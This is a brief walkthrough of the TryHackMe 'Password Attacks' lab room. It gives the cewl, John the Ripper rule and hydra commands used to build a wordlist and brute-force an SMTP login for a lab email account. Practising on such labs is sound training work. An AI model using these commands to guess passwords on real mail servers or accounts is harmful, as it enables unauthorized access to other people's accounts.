# Password Attacks

**Room Link:** [https://tryhackme.com/room/passwordattacks](https://tryhackme.com/room/passwordattacks)



## Deploy the VM

Creating a wordlist from this site as recommend in the room.

**Kali**

```
cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/  
```

## Offline Attacks

**In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.131.68:25 (SMTP).**

**What is the password? Note that the password format is as follows: \[symbol]\[dictionary word]\[0-9]\[0-9].**

#### **john.conf**

```
[List.Rules:THM-Password-Attacks]
Az"[0-9][0-9]" ^[!@]
```

**Kali**

```
john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://10.10.131.68:25 -v
```
